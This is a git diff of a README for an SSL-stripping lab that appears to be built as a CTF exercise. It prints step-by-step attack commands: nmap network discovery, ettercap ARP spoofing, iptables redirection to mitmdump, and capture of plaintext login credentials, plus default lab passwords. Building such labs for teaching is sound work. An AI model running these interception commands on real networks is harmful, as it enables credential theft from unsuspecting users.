@@ -1,98 +1,200 @@
 # BlueLedger - SSL Stripping Lab Environment
 
-A comprehensive SSL stripping laboratory with automated victim simulation and network discovery for cybersecurity education and defensive research.
+A comprehensive SSL stripping laboratory with automated victim simulation and network discovery for cybersecurity education and CTF challenges.
 
-## 🎯 Two Usage Modes (Docker or Podman)
+## 🎓 **CTF Challenge Setup**
 
-### 🔓 **SSL Stripping Lab Mode (Default)**
+This environment is designed for cybersecurity education and Capture The Flag (CTF) exercises. Students will learn SSL stripping attacks, network reconnaissance, and credential harvesting techniques.
+
+## 🚀 **Quick Start (2 Commands)**
+
+### **Step 1: Network Setup**
 ```bash
-docker-compose up --build
+./setup-macvlan.sh
 ```
 
-### 🌐 **Simple Application Mode**
+### **Step 2: Start Lab Environment**
 ```bash
-docker-compose -f docker-compose-simple.yml up --build
+docker compose up
 ```
 
-### 🐋 **Using with Podman Instead of Docker**
-```bash
-# SSL Stripping Lab Mode (native Podman script)
-./run-podman.sh
+**What happens automatically:**
+1. 🌐 Network auto-detection and macvlan configuration
+2. 🖥️  BlueLedger server starts with authentication working
+3. 🎭 Victim container gets real DHCP IP and simulates user traffic
+4. 🔓 Ready for SSL stripping attacks!
 
-# Simple Application Mode (requires podman-compose or manual setup)
-# Note: Complex networking works better with native Podman commands
-```
+## 🎯 **CTF Objectives**
 
-**Requirements for Podman:**
-- `podman` - Container engine
-- `iproute2` - Network tools (ip command)  
-- `gawk` - Text processing
-- **Root or rootless with subuids configured**
+### **Primary Goals:**
+- **Reconnaissance**: Discover victim container IP using nmap
+- **SSL Stripping**: Intercept HTTPS traffic and downgrade to HTTP
+- **Credential Harvesting**: Capture login credentials in plaintext
+- **Traffic Analysis**: Analyze captured network traffic
 
-## 🚀 SSL Stripping Lab Quick Start
+### **Learning Outcomes:**
+- Understanding SSL/TLS vulnerabilities
+- Network reconnaissance techniques
+- Man-in-the-middle attack execution
+- Traffic interception and analysis
 
-**One command starts everything:**
-```bash
-# Interactive mode
-docker-compose up --build
-
-# Detached mode (runs in background, still shows IPs automatically)
-docker-compose up --build -d
-
-# For Podman: Enable socket first, then use same commands!
-```
-
-**Automatic magic:**
-1. 🌐 Network auto-detection and DHCP configuration
-2. 🖥️  Ubuntu server gets real IP and runs BlueLedger
-3. 🎭 Debian victim gets real IP and attacks the server
-4. 📡 Container IPs displayed automatically with attack commands
-5. 🔓 Ready for SSL stripping attacks!
-
-## 🎭 What You Get
+## 🎭 **Lab Environment Components**
 
 ### **BlueLedger Server Container**
-- **Real DHCP IP** from your router (e.g., 192.168.1.248)
-- **Full BlueLedger website** running automatically
-- **HTTPS on port 5001** with self-signed certificates
-- **Appears as separate device** on your network
+- **Host Network Access**: Available on host IP (e.g., 192.168.3.41)
+- **Ports**: 3000 (Frontend), 5000 (HTTP API), 5001 (HTTPS API)
+- **Full BlueLedger Application**: Complete chemical supply chain management system
+- **Auto-Seeded Database**: Ready-to-use with default accounts
+- **SSL/TLS Enabled**: Self-signed certificates for HTTPS
 
 ### **SSL Victim Container**
-- **Real DHCP IP** from your router (e.g., 192.168.1.249)
-- **Auto-discovers server** via network scanning
-- **Realistic login attempts** every 30 seconds
-- **Credentials**: Employee@sinamoa.com / Employee123!@#
+- **Macvlan Network**: Gets real DHCP IP from router (e.g., 192.168.3.77)
+- **Auto-Discovery**: Finds BlueLedger server via network scanning
+- **Realistic Traffic**: Login attempts every 30 seconds with jitter
+- **Target for Attacks**: Perfect victim for SSL stripping demonstrations
 
-## 🔓 Performing SSL Stripping Attacks
+## 🔐 **Default Credentials**
 
-Once containers are running with real IPs, perform SSL stripping:
+### **Application Login Accounts:**
+- **Admin**: `admin@sinamoa.com` / `Admin123!@#`
+- **Manager**: `manager@sinamoa.com` / `Manager123!@#`
+- **Employee**: `employee@sinamoa.com` / `Employee123!@#`
 
-### **Method 1: MITMdump (Recommended)**
+### **Victim Simulation:**
+- **Target Account**: `employee@sinamoa.com` / `Employee123!@#`
+- **Attack Vector**: Victim container continuously attempts login via HTTPS
+
+## � **CTF Challenge Steps**
+
+### **Step 1: Network Reconnaissance**
 ```bash
-# Find container IPs
-docker ps --format "table {{.Names}}\t{{.Networks}}"
+# Discover victim container IP (it gets a random DHCP IP)
+nmap -sn 192.168.3.0/24
 
+# Alternative: Check ARP table
+arp -a
+
+# Look for container with different MAC address
+# Victim IP will be something like 192.168.3.77 (varies)
+```
+
+### **Step 2: Verify Target Services**
+```bash
+# Scan victim for open ports
+nmap -p- [VICTIM_IP]
+
+# Verify BlueLedger server accessibility
+curl -k https://192.168.3.41:5001/health
+```
+
+### **Step 3: SSL Stripping Attack**
+
+**Method 1: MITMdump (Recommended)**
+```bash
 # Terminal 1: Start traffic capture
 sudo mitmdump --mode transparent --ssl-insecure --showhost --set flow_detail=3
 
 # Terminal 2: ARP spoof the victim
-sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//
+sudo ettercap -T -M arp:remote /[VICTIM_IP]// /192.168.3.1//
 
-# Terminal 3: Redirect HTTPS traffic
-sudo iptables -t nat -A PREROUTING -s [VICTIM_IP] -p tcp --dport 443 -j REDIRECT --to-port 8080
+# Terminal 3: Redirect HTTPS traffic to MITMdump
 sudo iptables -t nat -A PREROUTING -s [VICTIM_IP] -p tcp --dport 5001 -j REDIRECT --to-port 8080
 ```
 
-### **Expected Results**
-- **Victim logs**: Shows 200 responses (login appears successful)
-- **MITMdump**: Shows "TLS handshake failed" then plaintext credentials
-- **Captured data**: `{"email":"Employee@sinamoa.com","password":"Employee123!@#"}`
+### **Step 4: Capture Credentials**
+- **Watch MITMdump output** for TLS handshake failures followed by plaintext HTTP
+- **Look for POST requests** to `/api/auth/login`
+- **Extract credentials**: `{"email":"employee@sinamoa.com","password":"Employee123!@#"}`
 
-**📚 Complete SSL stripping guide**: See `ssl-stripping-lab/SSL_Stripping_Lab_Guide_NEW.md`
+### **Expected Results**
+- **Victim logs**: Shows successful logins (200 responses)
+- **MITMdump**: Captures plaintext credentials after SSL downgrade
+- **Flag**: The captured password serves as the CTF flag
+
+**📚 Complete guide**: `ssl-stripping-lab/SSL_Stripping_Lab_Guide_NEW.md`
+
+## 🎓 **CTF Instructor Guide**
+
+### **Customizing Credentials for Your Class**
+
+**Method 1: Environment Variables (Recommended)**
+```bash
+# Edit docker-compose.yml and modify these environment variables:
+environment:
+  - JWT_SECRET=your-custom-jwt-secret-for-class
+  - SEED_DATABASE=true
+```
+
+**Method 2: Database Seeding Script**
+```bash
+# Edit: blueledger-app/backend/scripts/seed-database.js
+# Modify the users array with your custom credentials:
+
+const users = [
+  {
+    email: 'admin@yourschool.edu',
+    password: 'CustomAdmin2024!',
+    role: 'admin'
+  },
+  {
+    email: 'student@yourschool.edu',
+    password: 'StudentFlag2024!',
+    role: 'employee'
+  }
+];
+```
+
+### **Adding Intelligence Artifacts**
+
+**Upload Files via Web Interface:**
+1. Login as admin: `admin@sinamoa.com` / `Admin123!@#`
+2. Navigate to **Admin Panel** → **File Management**
+3. Upload documents, contracts, or intelligence files
+4. Set appropriate access permissions per role
+
+**Direct Database Insertion:**
+```bash
+# Connect to MongoDB container
+docker exec -it blueledger_mongodb mongosh blueledger
+
+# Insert custom documents
+db.documents.insertOne({
+  title: "Classified Chemical Formula",
+  content: "FLAG{chemical_compound_x7y9z2}",
+  classification: "TOP_SECRET",
+  uploadedBy: "admin@sinamoa.com",
+  accessLevel: "admin"
+});
+```
+
+**File Upload via API:**
+```bash
+# Upload files programmatically
+curl -X POST https://192.168.3.41:5001/api/admin/documents \
+  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
+  -F "file=@classified_document.pdf" \
+  -F "classification=SECRET"
+```
+
+### **CTF Scoring Integration**
+
+**Flag Locations:**
+- **Primary Flag**: Employee password (`Employee123!@#`)
+- **Secondary Flags**: Hidden in uploaded documents
+- **Bonus Flags**: Database records, API responses, log files
+
+**Verification Methods:**
+```bash
+# Check if students captured credentials
+grep "employee@sinamoa.com" /var/log/mitmdump.log
+
+# Verify document access
+docker exec blueledger_mongodb mongosh --eval "db.accessLogs.find()"
+```
 
 ---
 
-# 📁 Repository Structure
+# 📁 **Repository Structure**
 
 ```
 BlueLedger/
@@ -100,8 +202,8 @@ BlueLedger/
 │   ├── containers/                # Container definitions
 │   │   └── server_victim/         # Ubuntu server + Debian victim
 │   ├── scripts/                   # Lab utility scripts
-│   ├── SSL_Stripping_Lab_Guide_NEW.md  # Complete lab guide
-│   └── victim_simulator.py       # Victim traffic simulator
+│   ├── docs/                      # Documentation
+│   └── SSL_Stripping_Lab_Guide_NEW.md  # Complete lab guide
 │
 ├── 🏢 blueledger-app/            # BlueLedger Web Application
 │   ├── backend/                   # Node.js API server
@@ -110,10 +212,9 @@ BlueLedger/
 │   ├── deploy/                    # Kubernetes/deployment configs
 │   └── scripts/                   # Application utility scripts
 │
-├── docker-compose.yml             # SSL stripping lab (default)
-├── docker-compose-simple.yml     # Simple app mode
-├── show-ips.sh                    # Manual IP display
-└── README.md                      # This file
+├── docker-compose.yml             # Main lab environment
+├── setup-macvlan.sh              # Network configuration script
+└── README.md                      # This documentation
 ```
 
 ---
@@ -184,68 +285,70 @@ A comprehensive web application for managing chemical supply chain operations, c
 - **Monitoring**: Health checks and logging
 - **Security**: SSL/TLS encryption, security headers
 
-## ⚙️ Configuration
+## ⚙️ **Current Configuration**
 
-### Environment Variables
+### **Environment Variables (Auto-Configured)**
 ```env
-# Database
-MONGODB_URI=mongodb://admin:password123@mongodb:27017/sinamoa-chemicals
+# Database (MongoDB container)
+MONGODB_URI=mongodb://blueledger_mongodb:27017/blueledger
 
-# Authentication
-JWT_SECRET=your-super-secure-jwt-secret-key
+# Authentication (Fixed for CTF)
+JWT_SECRET=your-super-secure-jwt-secret-key-change-in-production
 JWT_EXPIRE=24h
 BCRYPT_ROUNDS=12
 
 # Server Configuration
-NODE_ENV=production
+NODE_ENV=development
 PORT=5000
 HTTPS_PORT=5001
 FRONTEND_URL=http://localhost:3000
 
-# Features
+# Auto-Seeding (Enabled)
 SEED_DATABASE=true
-RATE_LIMIT_WINDOW_MS=900000
-RATE_LIMIT_MAX_REQUESTS=100
 ```
 
-## 🚀 Development
-
-### Prerequisites
-- Node.js 18+
-- MongoDB 7.0+
-- **Docker & Docker Compose** OR **Podman** (uses same docker-compose files)
-
-### Quick Start
-
-```bash
-# Simple application mode
-docker-compose -f docker-compose-simple.yml up --build
-
-# SSL stripping lab mode
-docker-compose up --build
-
-# For Podman: Enable socket first, then use same commands
-# systemctl --user enable --now podman.socket
-# export DOCKER_HOST=unix:///run/user/$UID/podman/podman.sock
+### **Network Configuration (Auto-Detected)**
+```env
+# Created by setup-macvlan.sh
+NETWORK_INTERFACE=wlo1              # Your WiFi interface
+NETWORK_GATEWAY=192.168.3.1         # Your router IP
+NETWORK_SUBNET=192.168.3.0/24       # Your network subnet
 ```
 
-**Development mode (either engine):**
+## 🚀 **Prerequisites & Setup**
+
+### **System Requirements:**
+- **Docker & Docker Compose** (recommended)
+- **Linux host** with network interface access
+- **Root privileges** for network configuration
+- **nmap, ettercap, mitmdump** for SSL stripping attacks
+
+### **Quick Setup:**
 ```bash
-cd blueledger-app/backend && npm install && npm run dev
-cd blueledger-app/frontend && npm install && npm start
+# 1. Clone repository
+git clone <repository-url>
+cd BlueLedger
+
+# 2. Configure network
+./setup-macvlan.sh
+
+# 3. Start lab environment
+docker compose up
+
+# 4. Access applications
+# Frontend: http://192.168.3.41:3000
+# API: https://192.168.3.41:5001
 ```
 
-### Manual Setup
+### **Development Mode (Optional):**
 ```bash
-# Backend
+# Backend development
 cd blueledger-app/backend
-npm install
-npm run dev
+npm install && npm run dev
 
-# Frontend (new terminal)
+# Frontend development (new terminal)
 cd blueledger-app/frontend
-npm install
-npm start
+npm install && npm start
 ```
 
 ## 📊 API Documentation
@@ -319,13 +422,26 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 - 💬 **Discussions**: Community support via GitHub Discussions
 - 📧 **Contact**: For security issues, contact the maintainers directly
 
-## 🎓 Educational Use
+## 🎓 **Educational Objectives**
 
-This repository demonstrates:
-- SSL downgrade attack vectors and mitigation strategies
-- Automated victim simulation for security testing
-- Container networking and isolation techniques
-- Real-world web application security implementations
-- Defensive security monitoring and logging
+### **Learning Outcomes:**
+- **SSL/TLS Security**: Understanding encryption vulnerabilities and downgrade attacks
+- **Network Reconnaissance**: Using nmap and network discovery techniques
+- **Man-in-the-Middle Attacks**: ARP spoofing and traffic interception
+- **Traffic Analysis**: Capturing and analyzing network communications
+- **Web Application Security**: Authentication mechanisms and session management
+- **Container Networking**: Docker networking and macvlan configuration
 
-Perfect for cybersecurity education, defensive research, and security awareness training.
+### **Skills Developed:**
+- **Offensive Security**: SSL stripping, credential harvesting, network attacks
+- **Defensive Security**: Traffic monitoring, intrusion detection, log analysis
+- **Network Engineering**: Container networking, DHCP, routing configuration
+- **Web Development**: Understanding modern web application architecture
+
+### **CTF Integration:**
+- **Realistic Environment**: Production-like application with real vulnerabilities
+- **Scalable Challenges**: Easily customizable for different skill levels
+- **Automated Scoring**: Integration with CTF platforms via API endpoints
+- **Team Collaboration**: Multi-container environment supports team exercises
+
+Perfect for **cybersecurity courses**, **penetration testing training**, **network security labs**, and **capture-the-flag competitions**.
